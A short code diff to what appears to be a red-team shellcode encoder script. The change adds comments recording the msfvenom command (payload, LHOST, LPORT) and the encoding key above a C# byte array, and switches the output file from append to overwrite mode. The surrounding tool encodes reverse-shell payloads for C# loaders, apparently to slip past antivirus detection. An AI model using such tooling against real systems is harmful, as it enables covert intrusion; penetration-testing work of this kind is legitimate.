@@ -55,9 +55,11 @@ for i, byte in enumerate(payload):
 # Format the output payload
 payLen = len(payload)
 payload = re.sub("(.{65})", "\\1\n", ','.join(payload), 0, re.DOTALL)
-payloadFormatted = f"byte[] buf = new byte[{str(payLen)}] {{\n{payload}\n}};"
+payloadFormatted = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
+payloadFormatted += f"// {args.type}-encoded with key {hex(args.key)}\n"
+payloadFormatted += f"byte[] buf = new byte[{str(payLen)}] {{\n{payload}\n}};"
 if payLen > 1000:
-    f = open("/tmp/payload.txt", "a")
+    f = open("/tmp/payload.txt", "w")
     f.write(payloadFormatted)
     f.close()
     print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+] Encoded payload written to '/tmp/payload.txt' in CSharp format!{bcolors.ENDC}")
